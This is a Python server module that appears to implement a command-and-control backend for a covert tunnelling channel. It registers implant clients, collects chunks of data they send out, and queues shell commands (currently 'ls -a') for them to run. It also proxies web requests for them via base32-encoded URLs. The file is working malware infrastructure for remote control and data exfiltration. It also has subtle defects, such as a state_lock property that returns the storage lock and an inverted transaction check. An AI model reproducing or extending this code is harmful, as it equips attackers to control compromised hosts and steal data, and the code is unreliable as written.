from enum import Enum
from datastorage import ClientStorage
from random import randint
from time import sleep
import base64
import binascii
import requests
import threading


class StateEnum(Enum):
    IDLE = 'idle'
    RECEIVING_DATA = 'receiving_data'
    RECEIVING_REQUEST = 'receiving_request'
    SENDING_DATA = 'sending_data'
    REQUESTING_SHELL = 'requesting_shell'


class TransmissionTypeEnum(Enum):
    DATA = 'data'
    SHELL = 'shell'


class TransmissionState:

    def __init__(self, data: str, transmission_type: TransmissionTypeEnum):
        self._data = base64.b64encode(f"{transmission_type.name} {data}".encode('utf-8')).decode('utf-8')

    def get_next_data(self):
        next_data = self._data[:255]
        self._data = self._data[255:]

        return next_data


class ServerState:

    __NEXT_CLIENT_ID = 1
    __CLIENT_ID_LOCK = threading.Lock()

    def __init__(self):
        self.__state = {}
        self.__storage = {}
        self.__transaction_ids = []

        self.__state_lock = threading.Lock()
        self.__storage_lock = threading.Lock()
        self.__transaction_ids_lock = threading.Lock()

    @property
    def state_lock(self) -> threading.Lock:
        return self.__storage_lock

    @property
    def storage_lock(self) -> threading.Lock:
        return self.__storage_lock

    @property
    def transaction_ids_lock(self) -> threading.Lock:
        return self.__transaction_ids_lock

    @property
    def state(self) -> dict[int, dict[str, any]]:
        return self.__state

    def set_client_state(self, client_id: int, state: dict[str, any]) -> None:
        self.__state_lock.acquire()

        for k, v in state.items():
            self.__state[client_id][k] = v

        self.__state_lock.release()

    @property
    def storage(self) -> dict[int, ClientStorage]:
        return self.__storage

    def add_storage_head(self, client_id: int, data: str) -> None:
        self.__storage_lock.acquire()
        self.__storage[client_id].store_head(data)
        self.__storage_lock.release()

    def add_storage_body(self, client_id: int, data: str, done: bool) -> None:
        self.__storage_lock.acquire()
        self.__storage[client_id].store_body(data, done)
        self.__storage_lock.release()

    @property
    def transaction_ids(self) -> list[int]:
        return self.__transaction_ids

    def is_new_transaction(self, transaction_id: int) -> bool:
        self.__transaction_ids_lock.acquire()

        is_new = not (transaction_id in self.__transaction_ids)
        if not is_new:
            self.__transaction_ids.append(transaction_id)

        self.__transaction_ids_lock.release()

        return is_new

    def register_client(self) -> int:
        self.__CLIENT_ID_LOCK.acquire()
        c_id = self.__NEXT_CLIENT_ID
        self.__NEXT_CLIENT_ID += 1
        self.__CLIENT_ID_LOCK.release()

        self.state_lock.acquire()
        self.__state[c_id] = {'state': StateEnum.IDLE,
                              'transmission': None,
                              'request': b""}
        self.state_lock.release()
        self.storage_lock.acquire()
        self.__storage[c_id] = ClientStorage(c_id)
        self.storage_lock.release()

        return c_id


class ServerStateResponseHandler:

    def __init__(self, server_state: ServerState):
        self._server_state = server_state

    def request_id_response(self) -> str:
        c_id = self._server_state.register_client()
        return f"10.{randint(1,255)}.{randint(1,255)}.{c_id}"

    def data_response(self, client_id: int, data: str, is_head: bool, done: bool = False) -> str:
        self._server_state.set_client_state(client_id=client_id, state={'state': StateEnum.RECEIVING_DATA})

        if is_head:
            self._server_state.add_storage_head(client_id=client_id, data=data)
        else:
            self._server_state.add_storage_body(client_id=client_id, data=data, done=done)

        return f"{randint(11,255)}.{randint(1,255)}.{randint(1,255)}.{randint(1,255)}"

    def poll_response(self, client_id: int) -> str:
        # TODO: read from file
        shell_command = 'ls -a'

        self._server_state.set_client_state(client_id=client_id, state={'state': StateEnum.REQUESTING_SHELL,
                                                                        'transmission': TransmissionState(shell_command, TransmissionTypeEnum.SHELL)})

        self._server_state.state_lock.acquire()
        result = self._server_state.state[client_id]['transmission'].get_next_data()
        self._server_state.state_lock.release()

        return result

    def continue_response(self, client_id: int) -> str:
        self._server_state.state_lock.acquire()
        response = self._server_state.state[client_id]['transmission'].get_next_data()
        self._server_state.state_lock.release()

        if not response:
            self._server_state.set_client_state(client_id=client_id, state={'state': StateEnum.IDLE,
                                                                            'transmission': None})
            response = 'NOTHING'

        return response

    def curl_response(self, client_id: int, webpage: str, done: bool) -> str:
        self._server_state.state_lock.acquire()
        current_request = self._server_state.state[client_id]['request']
        self._server_state.state_lock.release()

        self._server_state.set_client_state(client_id=client_id, state={'request': current_request + webpage})

        if done:
            try:
                self._server_state.state_lock.acquire()
                requested_url = base64.b32decode(self._server_state.state[client_id]['request']).decode('utf-8')
                self._server_state.state_lock.release()
                curl = requests.get(requested_url).text
            except binascii.Error:
                curl = "ENCODING ERROR"

            self._server_state.set_client_state(client_id=client_id, state={'state': StateEnum.SENDING_DATA,
                                                                            'request': b"",
                                                                            'transmission': TransmissionState(curl, TransmissionTypeEnum.DATA)})

            self._server_state.state_lock.acquire()
            result = self._server_state.state[client_id]['transmission'].get_next_data()
            self._server_state.state_lock.release()

            if not result:
                return "NOTHING"

            return result
        else:
            self._server_state.set_client_state(client_id=client_id, state={'state': StateEnum.RECEIVING_REQUEST})

            return "NOTHING"


class ServerStateReader:

    def __init__(self, server_state: ServerState):
        self._server_state = server_state

    def __dump_latest_storage(self) -> None:
        self._server_state.storage_lock.acquire()
        for c_id, storage in self._server_state.storage.items():
            print(f"----- {c_id}-----")
            print("")
            storage.print_latest_storage()
            print("")

        self._server_state.storage_lock.release()

    def run(self):
        while True:
            sleep(10)
            self.__dump_latest_storage()


class ServerStateCommandWritter:

    def __init__(self, server_state: ServerState):
        self._server_state = server_state
